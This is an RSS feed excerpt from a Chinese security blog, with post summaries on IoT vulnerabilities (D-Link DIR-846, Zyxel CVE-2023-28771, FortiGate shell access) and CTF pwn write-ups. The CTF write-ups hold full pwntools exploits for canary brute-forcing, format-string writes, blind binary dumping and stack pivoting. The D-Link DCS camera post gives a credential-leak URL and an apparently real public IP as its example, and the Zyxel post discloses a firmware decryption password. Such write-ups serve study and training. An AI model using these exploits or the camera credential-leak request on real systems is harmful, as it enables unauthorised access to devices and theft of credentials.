      <link>https://jellyfish-pro.github.io/posts/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</guid>
      <description>CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。
该漏洞是对用户输入的字符串检测不够严格造成的。
固件版本：A1_FW100A43
影响范围：dlink:dir-846_firmware:100a43
测试环境：Ubuntu20 + qemu模拟debian
环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43
我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载
下载下来后使用binwalk解压：
binwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹
这里我们先找到我们需要启动的服务路径和名称。
根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：
可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：
首先看一看目标文件的架构：
可以看到是32位mips的小段
qemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：
sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .
-D：显示报错信息
-f ：指定配置文件
然后我们进行访问：
发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：
根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（大致猜测（×），百度一下（√））。例如 backend died指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动
我们退出qemu，搜索一下php-fastcgi相关的文件：
这里根据linux目录，可以判断我们需要启动 /etc/init.d/php7-fastcgi。</description>
    </item>
    
    <item>
      <title>CVE-2023-28771 合勤IPSec VPN服务命令注入漏洞</title>
      <link>https://jellyfish-pro.github.io/posts/cve-2023-28771-%E5%90%88%E5%8B%A4ipsec-vpn%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%9C%AA%E6%B5%8B%E8%AF%95%E9%80%9A%E8%BF%87/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/cve-2023-28771-%E5%90%88%E5%8B%A4ipsec-vpn%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%9C%AA%E6%B5%8B%E8%AF%95%E9%80%9A%E8%BF%87/</guid>
      <description>CVE-2023-28771 合勤IPSec VPN服务命令注入漏洞（未测试通过） 漏洞简介 该漏洞广泛存在于合勤防火墙设备中：
ATP防火墙（固件版本在4.60 至 5.35） USG FLEX（固件版本在4.60至5.35） VPN（固件版本在内4.60至5.35） ZyWALL/USG（固件版本在4.60至4.73） 并在网络上有完整的分析文章：[CVE-2023-28771 RCE分析与EXP](CVE-2023-28771 RCE分析与EXP (qq.com))
在文章中有给出exp.
通过这个exp，可以大概猜测到漏洞出在处理ikev2协议有关
不过该漏洞没有买到设备，所以只能使用exp去找ip测试。
寻找特征 固件解密 漏洞的特征我们需要去固件中找，固件则可以直接去官网下载（官网只能下载最近几个版本的固件）
同时，固件是加密过的zip文件，具体的解密原理：[Zyxel设备固件提取与口令破解](Zyxel设备固件提取与口令破解|NOSEC安全讯息平台 - 白帽汇安全研究院)
这里直接演示解压的过程。
官网下载后是一个压缩包，解压后的文件夹如下：
里面有一个xxx.ri的文件，该文件可以直接通过binwake解压出来，这里面存放着解压xxx.bin的密码
binwalk -Me1 473AAAB0C0.ri 解压后可以看到一个zld_fsextract文件，这个文件就是用来解压xxx.bin的二进制文件
这里我们file看一下这个文件：
是mips n32的架构，这里我们先将zld_fsextract文件复制到xxx.bin同级目录，然后使用qemu来进行用户级模拟：
./qemu-mipsn32-static ./zld_fsextract 473AAAB0C0.bin ./unzip -s extract -e code 直接使用qemu模拟的话会报错：
这里的权限不够不能使用sudo来解决，因为这里需要的是设备的权限，而不是物理机的权限。
这里我们需要使用strace命令，来看看zld_fsextract文件的执行情况：
strace -f -s 199 ./qemu-mipsn32-static ./zld_fsextract 473AAAB0C0.bin ./unzip -s extract -e code 在函数的调用链中，可以看到一个execveat函数。而这个函数参数里的50QLc3QbsoeAX53dREVw8rTxwc5IAYYHa.eD45qyvU8TbD63Td/dUUaR7ilJGJc就是解压密码
然后使用7z，输入密码，就可以解压：
这里面有一个compress.img，这个就是根目录系统，直接解压就行：
比较特征 这里我们选择的是compress\usr\local\zyxel-gui\htdocs\images\login.css
这个文件里有直接记录当前reset.css版本号，并且可以直接访问：
通过这一点就可以判断目标ip的固件版本
ip测试 这里直接使用的上面的exp，判断版本号后也无法成功返回shell。并且没有设备，并不知道问题出在哪里</description>
    </item>
    
    <item>
      <title>Dlink-DCS摄像头系列 账户密码泄露漏洞（未进行分析）</title>
      <link>https://jellyfish-pro.github.io/posts/dlink-dcs%E6%91%84%E5%83%8F%E5%A4%B4%E7%B3%BB%E5%88%97-%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E6%9C%AA%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/dlink-dcs%E6%91%84%E5%83%8F%E5%A4%B4%E7%B3%BB%E5%88%97-%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E6%9C%AA%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90/</guid>
      <description>Dlink-DCS摄像头系列 账户密码泄露漏洞（未进行分析） 该漏洞可以泄露用户的账号和密码，使用账号和密码可以登录页面。
可以在网页上直接访问url，也可以使用脚本获得
如果要访问url的话则需要使用如下的url：
http://xxx.xxx.xxx.xxx:xxxx/config/getuser?index=0 获得账户密码后直接访问ip就可登录：
http://xxx.xxx.xxx.xxx:xxxx 若要使用python脚本：
USEG: ./exp http://ip:portor./exp https://ip:port 例如：
http://14.100.101.68:8080/config/getuser?index=0 </description>
    </item>
    
    <item>
      <title>enumcanary</title>
      <link>https://jellyfish-pro.github.io/ctf/enumcanary/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/enumcanary/</guid>
      <description>首先拿到文件我们先查看保护机制：
可以看到，这道题是打开了栈溢出检测的。
然后我们运行程序（首先要在当前目录下创建一个flag文件，否则会报错）：
可以看到程序实现了一个类似于客户端的效果。如果我们利用nc指令进行连接的话：
程序会让我们输入一串字符（这里输入的时aaaa），然后返回Message received!
然后通过ida我们可以看到程序会打开一个‘./flag’文件：
这里可以看到，通过read函数，将flag读入到了0x602120这个地址。
然后在别的地方，我们也可以看到一个send函数，会将0x602120这个地址里的东西发送出去：
最后我们看到main函数，通过main函数，可以了解到这个程序就是类似于客户端，如果有连接，就会通过fork函数复制一个新的进程，让连接访问这个复制出来的新进程。
对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的。因为内存布局是一样的，所以canary也一定是一样的。
爆破canary的基本逻辑为：
我们知道程序在结束时，会判断canary是否发生改变，如果改变，就会输出**“* stack smashing detected *”，然后程序就会终止。程序终止，在我们客户端上的表现就是，接收不到任何的数据，但是如果canary没有改变，我们客户端就会接收到服务器端发送的Message received!。那么我们就可以通过特征，来对canary进行一位一位的爆破。首先canary的最低为一定为‘\x00’，所以我们从第二位开始爆破，第二位从&amp;quot;\x00&amp;quot;开始，逐一增加，如果错误，则接收不到回响，如果正确就接受到Message received!**，所以如果有接收，就爆破下一位。
假如canary如图：
我们按位进行爆破：
那么，我们就可以通过fork函数，对canary进行爆破：
from pwn import *context.log_level = &amp;#39;debug&amp;#39;canary = b&amp;#34;\x00&amp;#34;padding = b&amp;#34;a&amp;#34;*264for x in range(7):for y in range(1,0x100):p = remote(&amp;#34;127.0.0.1&amp;#34;,10011)print(p.recv())p.send(padding+canary+ bytes([y]))try:info = p.recv()print(info)except:p.close()continuep.close()breakcanary += bytes([y])print(&amp;#34;success get blasting!&amp;#34;)print(&amp;#39;type =&amp;#39;,type(canary))print(canary) 这里我们先在本地进行连接，实验一下爆破canary的exp：
可以看到canary被爆出来了。然后利用这个canary，构造ROP将flag输出出来：</description>
    </item>
    
    <item>
      <title>format0</title>
      <link>https://jellyfish-pro.github.io/ctf/format0/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format0/</guid>
      <description>首先我们检查保护机制：
我们可以看到有canary，可以修改got表。
这里我们第一反应应该是采用泄露canary和修改got表的办法。
但是我们运行文件可以发现，程序并不是一个无线循环的程序，意思就是我们虽然可以泄露canary，但是输入canary之后程序就结束了，并不能将canary利用起来。
由此我们可以知道，这是一个只能使用一次的格式化字符串漏洞。
然后我们进入IDA查看这个文件：
我们可以清楚的看到程序的逻辑，就是生成两个随机数后相加，然后与我们输入的字符进行比较，如果相同就给我们shell。
因为v5和s两个变量是随机生成的数字。所以我们只能通过格式化字符串来修改v2的值。
我们到GDB中调试查看一下程序具体的流程：
在memset函数这里初始化了两个栈空间：
然后两个read函数读取两个随机字符到刚刚初始化的两个栈空间中
然后程序让我们输入v2字符串，放到栈空间中去：
然后就是比较我们输入的v2和刚刚两个随机字符的和是否相等：
程序的流程就是这样了，接下来我们需要了解格式化字符串的一个符号
%*k$c%x$n %*k$c的含义就是：输出格式化字符串第k个变量个字符。
x %*k$c%x$n的含义是：将输出格式化字符串第k个变量个字符的个数写入格式化字符串第x个变量指向的地址中
而在这道题中，我们可以看到两个随机数的偏移量为10和11，而存放v2的栈空间的偏移量为9，所以我们payload为：
payload = b&amp;#39;%*10$c%*11$c%9$lln&amp;#39; 这样写就表示，先输出第10个偏移量中的值这么多个字符，再输出第11个偏移量中的值这么多个字符，最后将一共输出的字符存放在第九个偏移量中所指向的地址
完整的exp为：
from pwn import *#context.log_level = &amp;#39;debug&amp;#39;#p = process(&amp;#39;./format0&amp;#39;)p = remote(&amp;#39;10.0.25.109&amp;#39;,20000)if args.G:gdb.attach(p)p.recvuntil(&amp;#39;your name:&amp;#39;)payload = b&amp;#39;%*10$c%*11$c%9$lln&amp;#39;p.sendline(payload)p.recvuntil(&amp;#39;you shell...&amp;#39;)p.sendline(&amp;#39;a&amp;#39;)p.interactive() </description>
    </item>
    
    <item>
      <title>format1</title>
      <link>https://jellyfish-pro.github.io/ctf/format1/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format1/</guid>
      <description>首先我们查看一下保护机制：
可以看到，这道题是打开了canary保护。之前做stack smaches时，我们了解了如何利用canary溢出报错来打印我们需要的flag。
canary检测机制 虽然当时我们了解到，canary检测到溢出之后，会调用stack_chk_fail函数，并且在这个函数里打印字符串。但是，我们当时并没有说明。canary保护是怎么检测到溢出的，现在利用这道题，我们可以了解一下canary检测方式和绕过canary的方法。
通过IDA我们可以发现，这个函数的功能函数有俩个gets函数：
v1的大小为30h（48个字节）
我们知道，gets函数有着溢出的风险，那么通过这俩个gets函数，我们来看一看canary是如何检测溢出的。
首先我们在gets函数和printf函数处打上断点。
然后来到第一个gets函数里，步进到_IO_getline函数处：
这里我们随便输入一个不会产生溢出的值，我输入的为‘as&#39;
输入之后，利用stack 20指令查看栈空间,找到程序存放‘as’的地方：
在上面查看IDA时，我们发现存放字符的空间大小为30h（48字节）。那么，在栈空间里，字符可以存放的大小为：48/8=6排。
可以看到，在图中我们输入的值后的第六排，有一个八个字符、以\x00结尾的无规律字符串0x9a05e8afeb322300。
这个八位字符，就是canary生成的检测字符，如果这个字符改变，则canary就会在程序结束时调用stack_chk_fail函数。canary不是固定的，但最后一个字节一定是\x00。
我们在gdb里观察一下：
我们可以正常返回main函数：
然后我们使用c指令，来到第二个gets函数处，这里我们尝试溢出来改变canary的值。
可以看到这里canary已经改变了，接着我们接着执行：
在程序结束时，程序调用了stack_chk_fail函数。
绕过canary 因为canary保护需要检测canary的值有没有被改变。那么我们在构造payload时，将原本的canary值放到canary本来的地址上，就好了。
利用printf函数泄露canary值 因为canary每次都不同，意味着我们每次都需要改变canary的值。
那么如何获得程序中canary的值呢。
这里我们就可以利用printf函数来进行泄露。
%n$p //n代表第几个参数，p表示打印的是一个地址。 我们在gdb中查看，canary是第几个参数：
因为64为前6个参数通过寄存器传递，所以是这里第10个。
接着我们尝试输入%10$p尝试一下：
可以看到，并不是canary，而是canary上方的地址，说明我们应该输入%11$p
构造exp 接下来我们就可以构造exp了：
sys_addr = 0x4006E7	//system函数地址payload1 = &amp;#39;%11$p&amp;#39;p.sendline(payload1)canary =int( p.recv(18),base = 16)	//将接收到的canary转化为16进制的int类型print(&amp;#39;canary =&amp;#39;,hex(canary))canary_val = canary.to_bytes(9,&amp;#39;little&amp;#39;)	//将int类型的canary转为bytes #format1from pwn import *#p = process(&amp;#39;./format1&amp;#39;)p = remote(&amp;#39;10.0.25.109&amp;#39;,20000)a = 0x400760if args.</description>
    </item>
    
    <item>
      <title>format2_new</title>
      <link>https://jellyfish-pro.github.io/ctf/format2_new/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format2_new/</guid>
      <description>我们首先还是先远程连接一下这个程序：
发现程序的逻辑为输入什么就输出什么。
那我们修改一下dump脚本，直接泄露：
from pwn import *proc = &amp;#39;./format2&amp;#39;#context.log_level = &amp;#39;debug&amp;#39;def leak(b_addr , a):#p = process(proc)p = remote(&amp;#39;10.0.25.109&amp;#39;,20001)b_addr1 = str(hex(b_addr))print(&amp;#39;b_addr1 =&amp;#39;,hex(b_addr))if b_addr1[-2:] == &amp;#39;0a&amp;#39;:info = b&amp;#34;\x00&amp;#34;else:pad = b&amp;#39;%7$s.tmp&amp;#39;+p64(b_addr)#gdb.attach(p)p.sendline(pad)p.recvuntil(&amp;#39;me!&amp;#39;)p.recvuntil(&amp;#39;\n&amp;#39;)info = p.recvuntil(&amp;#39;.tmp&amp;#39;, drop=True)if not info :info = b&amp;#34;\x00&amp;#34;p.close()return infob_addr = 0x400680b_end = 0x400a00res = b&amp;#39;&amp;#39;a = 0while b_addr&amp;lt;b_end:info = b&amp;#39;&amp;#39;info = leak(b_addr,a)print(&amp;#39;leak = &amp;#39;,info)a +=1b_addr += len(info)res += infoprint(&amp;#39;leak_addr = &amp;#39;,hex(b_addr))#print(&amp;#39;res = &amp;#39;,res)print(&amp;#34;dump length is: &amp;#34;, len(res))with open(&amp;#34;dump_file2&amp;#34;, &amp;#34;wb&amp;#34;) as f:f.</description>
    </item>
    
    <item>
      <title>format2_old</title>
      <link>https://jellyfish-pro.github.io/ctf/format2_old/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format2_old/</guid>
      <description>这道题是一道blind-pwn，也就是盲打。不会提供binary，需要我们利用格式化字符串对binary进行泄露。因为格式化字符串泄露的为内存空间，所以泄露出来的binary可能会存在混乱、残缺等问题。
首先我们先连接一下这道题：
注：因为32位的远程连接已经替换为64位，所以我们使用本地文件模拟泄露。 打开文件后，显示字符串“ping me”
然后我们随意输入字符，程序都会输出我们输入的字符：
如果不输入字符串直接回车的话，就会显示哭泣：
那么根据格式化字符串的原理，我们需要知道其偏移量，也就是我们输入的字符串是放在相对于格式化字符串的第几个参数。
我们使用下面的指令查看：
aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p 可以看到，是第七个参数。
我们再尝试输入
bbbb%7$p 程序讲bbbb的十六进制输出了出来，证明偏移量的确是7。
知道了偏移量接下来就是泄露binary文件：
from pwn import *proc = &amp;#39;./format2&amp;#39;def leak(b_addr , a):p = process(proc)pad = b&amp;#39;%9$s.tmp&amp;#39;+p32(b_addr)p.sendline(pad)p.recvuntil(&amp;#39;me&amp;#39;)p.recvuntil(&amp;#39;\n&amp;#39;)info = p.recvuntil(&amp;#39;.tmp&amp;#39;, drop=True)if not info :info = b&amp;#34;\x00&amp;#34;p.close()return infob_addr = 0x8048000b_end = 0x0804A000res = b&amp;#39;&amp;#39;a = 0try:while b_addr &amp;lt;= b_end:info = b&amp;#39;&amp;#39;print(&amp;#39;leak2 = &amp;#39;,info)info = leak(b_addr,a)print(&amp;#39;leak = &amp;#39;,info)a +=1b_addr += len(info)res += infoprint(&amp;#39;leak_addr = &amp;#39;,hex(b_addr))#print(&amp;#39;res = &amp;#39;,res)except Exception as e:print(e)	print(&amp;#34;dump length is: &amp;#34;, len(res))with open(&amp;#34;dump_file1&amp;#34;, &amp;#34;wb&amp;#34;) as f:f.</description>
    </item>
    
    <item>
      <title>format3_new</title>
      <link>https://jellyfish-pro.github.io/ctf/format3_new/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format3_new/</guid>
      <description>首先检查保护机制：
不能修改got表，有栈溢出检测
接着运行一下程序：
程序会让我们分别输入两次，然后再打印分别将两次输入打印出来。
我们输入什么就会输出什么，这里可能存在格式化字符串的漏洞，我们接下来将二进制文件拖进IDA中：
在IDA中我们很容易看到，在main函数里调用了有两个格式化漏洞的函数。同时为了方便下文引用，将这个函数重命名为func。
同时，我们也可以在文件中找到一个system函数：
那么现在这道题思路就是：
1. 利用第一个printf函数泄露func函数的rbp
2. 通过rbp，定位存放func函数的返回地址的地址
3. 利用第二个printf函数的格式化字符串漏洞，修改返回地址为system函数
首先我们泄露main函数调用func函数时，压入的rbp。
我们进入gdb，将断点打在func函数处，然后步进到第一个printf函数处，然后查看栈信息：
可以看到rbp相对于格式化字符串的偏移量为：44，所以我们泄露rbp的exp为：
from pwn import *context.log_level=&amp;#34;debug&amp;#34;#p=process(&amp;#34;./format3&amp;#34;)p = remote(&amp;#39;10.0.25.109&amp;#39;,20003)payload = &amp;#39;%44$p&amp;#39;sys_addr = 0x400817#gdb.attach(p)	//因为内存地址随时会变，所以需要进入gdb查看输出是否正确p.recvuntil(&amp;#39;name:&amp;#39;)p.sendline(payload)p.recvuntil(&amp;#39;\n&amp;#39;)leak = int(p.recvuntil(&amp;#39;Please&amp;#39;,drop = True),base = 16)print(&amp;#39;leak =&amp;#39;,hex(leak))	//泄露出来的rbpret_addr = leak - 0x8	//rbp的地址减去8，就是func函数返回地址所在值print(&amp;#39;ret_addr =&amp;#39;,hex(ret_addr)) 可以看到无论是泄露的内存地址，还是存放func返回值的地址都是匹配的。
然后我们就需要利用第二个printf函数将返回值改为system函数的地址：
可以看到返回值为0x40098c，system函数地址为0x400817只有两个字节不同，所以我们使用%hn进行修改
0x0817 = 2071，所以我们需要输出2071个字符
payload2 =b&amp;#39;%2071c%12$hnaaaa&amp;#39; //最后四个‘a’,是用来填充内存的，试内存得以对齐payload2 += p64(ret_addr) 完整的exp：
from pwn import *context.</description>
    </item>
    
    <item>
      <title>format3_old</title>
      <link>https://jellyfish-pro.github.io/ctf/format3_old/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format3_old/</guid>
      <description>首先查看保护机制：
可以看到got表不能修改，没有栈溢出检查和地址随机化
按照之前的流程，我们接下来会将程序拖入IDA中查看，但是这个程序在拖入IDA之前，我建议先运行一下，查看一下程序的流程。这样做的原因是，这道题有着较多功能函数，如果直接放入IDA，容易被绕晕。
运行程序首先是打印几排字符串，让我们先注册：
我们注册后会显示注册成功：
然后跳出菜单让我们选择：
三个选项，如果输入1，就会显示我们刚刚注册的账户：
如果选择2，则会让我们重新输入username和password：
如果选择3，则会退出。
然后我们再进入IDA中查看：
这里我已经将大部分函数按照其功能重新命名（注：这里我将打印username和password的函数取名为show）。
通过刚刚的运行，我们知道了，程序会让我们首先注册，然后如果我们选择1.Sh0w Account Infomation!，程序就会将我们输入的账户和密码输出出来。那么在这个地方，就可能存在格式化字符串漏洞。
我们在IDA中找到输出账户和密码的函数：
可以看到，这个函数有两个printf函数，那么这里就可以利用格式化字符串漏洞。
同时，我们可以在IDA中找到，system函数：
然后我们进入gdb，断点打在show函数处，查看偏移量：
可以看到，我们输入的字符串在第8个偏移量（0x7fffffffdcd0）。同时根据函数调用的知识，我们可以判断，第7个偏移量为show函数的返回值，第6个偏移量为上一个函数的rbp。如果可以修改这个返回值到system函数，那么我们就可getshell。
那么怎么修改返回值呢，我们可以使用修改got表的方式，来修改内存，我们只需要找到存放返回值的内存地址，就可以修改返回地址。
我们知道每次程序运行时内存地址是不固定的，但是根据函数调用的知识，我们知道，返回地址和存放上一个函数rbp的位置是固定的。那就是上面说到的第7个偏移量和第6个偏移量。然后我们利用第6个偏移量所存放的值(0x7fffffffdd00)，减去返回值所在的栈地址(0x7fffffffdcc8)：
0x7fffffffdd00 - 0x7fffffffdcc8 = 0x38 这样我们就得到了返回值所在的地址。
所以这里我们先泄露第6个偏移量的值，得到上一个函数的rbp，然后减去0x38，就是返回值所在的地址。
from pwn import *context.log_level=&amp;#34;debug&amp;#34;#p=process(&amp;#34;./format3&amp;#34;)p = remote(&amp;#39;10.0.25.109&amp;#39;,20003)binary=ELF(&amp;#34;format3&amp;#34;)#gdb.attach(sh)p.recvuntil(&amp;#39;Input your username(max lenth:20):&amp;#39;)p.sendline(&amp;#39;.tmp&amp;#39;)p.recvuntil(&amp;#39;Input your password(max lenth:20):&amp;#39;)p.sendline(&amp;#39;%6$p&amp;#39;)p.recvuntil(&amp;#39;Register Success!!\n&amp;#39;)p.sendline(&amp;#39;1&amp;#39;)p.recvuntil(&amp;#39;.tmp\n&amp;#39;)rbp = int(p.recvline(),base = 16)print(&amp;#39;rbp = &amp;#39;,hex(rbp))ret_addr = rbp - 0x38print(&amp;#39;ret_addr = &amp;#39;,hex(ret_addr)) 得到返回值地址后，我们就要利用格式化字符串修改返回值。</description>
    </item>
    
    <item>
      <title>format4_new</title>
      <link>https://jellyfish-pro.github.io/ctf/format4_new/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format4_new/</guid>
      <description>首先我们查看保护机制：
可以看到，打开了canary。
接着我们运行程序：
程序的功能类似于一个记事本，输入‘1’添加消息，输入‘2’显示输入的消息。
因为程序会输出我们输入的东西，那么就有可能存在格式化字符串漏洞，我们输入连续的.%P进行尝试：
可以看到输出了内存中的值，那么我们就可以利用这个格式化字符串漏洞。
要利用格式化字符串漏洞，我们需要知道偏移量，这里我们进入gdb进行调试。
这里我们在格式化字符串漏洞处下断点（格式化字符串漏洞的地址可以在ida中进行查看）：
然后将程序跑起来：
输入message后，再选择“Show Message”。gdb就会将程序断在断点处：
我们可以看到，程序并没有将我们输入的字符串存放在栈中，而是存放在了一个很明显不是栈的地址。
通过vmmap指令，我们可以知道，这个地址是在堆中：
存放在了堆上，我们就不能通过泄露canary覆盖返回地址的方法了。
虽然我们不能使用栈溢出覆盖返回地址，但是我们可以使用leave栈迁移的方法，将栈转移到一个虚假的栈上。
leave = MOV RSP, RBPPOP RBP 通过这个指令会将RBP的值赋给RSP，那么如果我们将栈中的RBP的值给修改了，运行到leave指令时，RSP就会转跳到我们指定的地址。
所以，我们通过程序的写入功能，在堆上写入一个ROP链，使用格式化字符串的写入功能，改变RBP。然后利用leave指令，将栈迁移到ROP链的地址上。
使用这个方法，我们需要先泄露libc的版本，找到基地址、system函数的地址和“/bin/sh”字符串的地址。
在gdb中我们可以看到__libc_start_main函数的偏移量：
偏移量为0xf+6=21。
注：这里我们泄露出来的不是（______libc_start_main）而是（__libc_start_main+240）,所以泄露出来的地址需要减去240 from pwn import *context.log_level = &amp;#39;debug&amp;#39;#p = process(&amp;#39;format4&amp;#39;)p = remote(&amp;#39;10.0.25.109&amp;#39;,20004)pop_rdi_ret = 0x400c03def add(payload):lenth = len(payload)p.recvuntil(&amp;#39;Exit.&amp;#39;)p.sendline(&amp;#39;1&amp;#39;)p.recvuntil(&amp;#39;Please enter your message length:&amp;#39;)p.sendline(str(lenth))p.recvuntil(&amp;#39;Please enter your Message:&amp;#39;)p.sendline(payload)#--------------------------------第一次输入--------------------------------------payload = b&amp;#39;%21$p.tmp&amp;#39;add(payload)p.recvuntil(&amp;#39;Exit.&amp;#39;)p.sendline(&amp;#39;2&amp;#39;)p.recvuntil(&amp;#39;Message3: 0x&amp;#39;)leak = int(p.</description>
    </item>
    
    <item>
      <title>format4_old</title>
      <link>https://jellyfish-pro.github.io/ctf/format4_old/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/ctf/format4_old/</guid>
      <description>首先查看保护机制：
32位程序，开启了栈溢出保护和NX，可以修改got表
然后我们运行程序，查看程序的内容：
可以看到这个程序类似于建立通讯目录的功能，我们可以选择创建目录，溢出目录，编辑目录，展示目录，退出。
根据我们经验，我们可以猜测，我们可以在创建目录里输入格式化字符串的payload，然后再展示目录时利用格式化字符串：
然后我们在IDA中查看文件：
这里我将每个函数都根据内容重新命名了，因为我们知道了展示目录的选项中有格式化字符串漏洞，所以我们进入show函数就可以找到这个全是printf函数的函数（这里我将其命名为printff）：
现在，我们知道了格式化字符串，got表也是可以修改的，那么我们可以选择修改printf函数的got表为system函数了吗？
答案是否定的，因为这个程序不仅在这里使用了printf函数，在其他的功能里都使用了printf函数，如果直接修改got，并不能保证程序会按照我们的意愿进入system函数。
而且，在gdb调试中我们是可以看到，其实我们输入进程序的字符，并不是存在栈上的，而是存在于.bss段中，也就是堆中。
所以这道题我们不能直接利用%n修改栈中的值来获得shell。
那么我们可以换一个思路，首先利用程序，将在堆上构建一个虚假的栈，然后将函数ebp的值修改为虚假的栈的起始地址。
1.利用程序创建目录的功能，在堆上写入一个虚假的栈。2.利用格式化字符串，修改函数的ebp3.当函数返回时，栈地址就会来到我们构建的虚假地址。 通过IDA我们可以看到程序并没有system函数和/bin/sh
所以我们还是要泄露程序的libc版本：
from pwn import *sh = process(&amp;#39;./format4&amp;#39;)#sh = remote(&amp;#39;10.0.25.109&amp;#39;,20004)contact = ELF(&amp;#39;./format4&amp;#39;)#context.log_level = &amp;#39;debug&amp;#39;#通过创建目录选项，输入payloaddef createcontact(name, phone, descrip_len, description):sh.recvuntil(&amp;#39;&amp;gt;&amp;gt;&amp;gt; &amp;#39;)sh.sendline(&amp;#39;1&amp;#39;)sh.recvuntil(&amp;#39;Contact info: \n&amp;#39;)sh.recvuntil(&amp;#39;Name: &amp;#39;)sh.sendline(name)sh.recvuntil(&amp;#39;You have 10 numbers\n&amp;#39;)sh.sendline(phone)sh.recvuntil(&amp;#39;Length of description: &amp;#39;)sh.sendline(descrip_len)sh.recvuntil(&amp;#39;description:\n\t\t&amp;#39;)sh.sendline(description)#输入payload后利用printf函数展示结果def printcontact():sh.recvuntil(&amp;#39;&amp;gt;&amp;gt;&amp;gt; &amp;#39;)sh.sendline(&amp;#39;4&amp;#39;)sh.recvuntil(&amp;#39;Contacts:&amp;#39;)sh.recvuntil(&amp;#39;Description: &amp;#39;)printf = 0x08048BD1# get system addr &amp;amp; binsh_addrpayload = &amp;#39;%31$paaaa&amp;#39;createcontact(&amp;#39;1111&amp;#39;, &amp;#39;1111&amp;#39;, &amp;#39;111&amp;#39;, payload)printcontact()libc_start_main_ret = int(sh.</description>
    </item>
    
    <item>
      <title>FortiGate飞塔获取shell方法</title>
      <link>https://jellyfish-pro.github.io/posts/fortigate%E9%A3%9E%E5%A1%94%E8%8E%B7%E5%8F%96shell%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://jellyfish-pro.github.io/posts/fortigate%E9%A3%9E%E5%A1%94%E8%8E%B7%E5%8F%96shell%E6%96%B9%E6%B3%95/</guid>
      <description>FortiGate飞塔获取shell方法 获取根目录文件 我们首先找到安装飞塔虚拟机的路径：
看到这两个VMware硬盘文件，将其中这个较大的复制出来，添加到Ubuntu下：
随后在Ubuntu中就可以看到这个硬盘：
我们将这个256M大小的区域挂载到我们指定的文件夹下：
sudo mount /dev/nvme0n1p1 /mnt/fortigate/ 就可以看到被打包好的飞塔根文件目录：
我们将这个文件复制出来，然后解压：
gzip -d rootfs.gzsudo cpio -idmv &amp;lt; ./rootfssudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xzsudo chroot . /sbin/ftar -xf /bin.tar patch原init 随后我们找到./bin/init，将其放入ida中，这里ida可能要加载半天。
在main函数中，我们可以看到如下的逻辑：
请注意这两个if语句。check_xor()和check_rootfs()这两个函数的主要功能是对系统和根文件系统进行检查，因为后面我们要更改根文件系统，所以这里需要将这两个if给patch掉：
第一点：
patch前：
patch后：
第二点：
patch前：
patch后：
随后我们保存patch，将保存下来的init替换原来的./bin/init。
替换了init后，我们需要将busybox放入bin目录下：
